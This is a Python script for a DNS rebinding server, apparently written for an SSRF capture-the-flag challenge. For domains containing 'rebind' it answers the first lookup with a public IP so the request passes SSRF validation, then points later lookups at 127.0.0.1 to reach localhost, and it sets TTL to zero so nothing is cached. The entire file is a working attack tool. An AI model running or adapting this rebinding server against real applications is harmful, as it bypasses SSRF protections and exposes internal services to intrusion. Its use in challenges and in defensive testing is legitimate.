#!/usr/bin/env python3
"""
Simple DNS rebinding server
Run this on port 5353 (no sudo needed) and configure your system to use it
"""
import socket
import struct
import threading
from datetime import datetime

# Rebinding state: domain -> (public_ip, private_ip, counter)
rebind_state = {}

PUBLIC_IP = "8.8.8.8"
PRIVATE_IP = "127.0.0.1"

def parse_dns_query(data):
    """Parse DNS query to extract domain name"""
    try:
        # Skip header (12 bytes), parse question section
        i = 12
        domain_parts = []
        while i < len(data):
            length = data[i]
            if length == 0:
                break
            i += 1
            domain_parts.append(data[i:i+length].decode('utf-8'))
            i += length
        domain = '.'.join(domain_parts)
        return domain
    except:
        return None

def create_dns_response(query_data, domain, ip_address):
    """Create DNS response"""
    # DNS header (copy from query)
    response = bytearray(query_data[:2])  # Transaction ID
    response.extend(b'\x81\x80')  # Flags: response, no error
    response.extend(query_data[4:6])  # Questions count
    response.extend(b'\x00\x01')  # Answers count (1)
    response.extend(b'\x00\x00')  # Authority RRs
    response.extend(b'\x00\x00')  # Additional RRs

    # Copy question section
    i = 12
    while i < len(query_data):
        if query_data[i] == 0:
            response.extend(query_data[12:i+5])
            break
        i += 1

    # Answer section
    response.extend(b'\xc0\x0c')  # Pointer to domain name
    response.extend(b'\x00\x01')  # Type A
    response.extend(b'\x00\x01')  # Class IN
    response.extend(b'\x00\x00\x00\x00')  # TTL (0 for no caching)
    response.extend(b'\x00\x04')  # Data length (4 bytes for IPv4)

    # IP address
    ip_parts = [int(x) for x in ip_address.split('.')]
    response.extend(bytes(ip_parts))

    return bytes(response)

def dns_server(port=5353):
    """Run DNS server on specified port"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))

    print(f"[*] DNS Rebinding Server started on port {port}")
    print(f"[*] Public IP: {PUBLIC_IP}, Private IP: {PRIVATE_IP}")
    print(f"[*] Ready to rebind!")
    print()

    while True:
        try:
            data, addr = sock.recvfrom(512)
            domain = parse_dns_query(data)

            if not domain:
                continue

            # Check if this is a rebinding domain
            if 'rebind' in domain.lower():
                # Initialize state if new domain
                if domain not in rebind_state:
                    rebind_state[domain] = 0

                # Alternate between public and private IP
                count = rebind_state[domain]
                rebind_state[domain] += 1

                # First request: public IP, subsequent: private IP
                if count == 0:
                    ip = PUBLIC_IP
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] {domain} -> {ip} (PUBLIC - will pass validation)")
                else:
                    ip = PRIVATE_IP
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] {domain} -> {ip} (PRIVATE - accessing localhost!)")

                response = create_dns_response(data, domain, ip)
                sock.sendto(response, addr)
            else:
                # For non-rebinding domains, return public IP
                response = create_dns_response(data, domain, PUBLIC_IP)
                sock.sendto(response, addr)

        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    print("="*70)
    print(" DNS Rebinding Server for SSRF Challenge")
    print("="*70)
    print()
    print("This server will alternate DNS responses:")
    print("  1st request: 8.8.8.8 (passes SSRF validation)")
    print("  2nd+ requests: 127.0.0.1 (accesses localhost)")
    print()
    print("To use this server, you need to configure your system DNS or")
    print("use a custom resolver in your exploit.")
    print()

    dns_server()
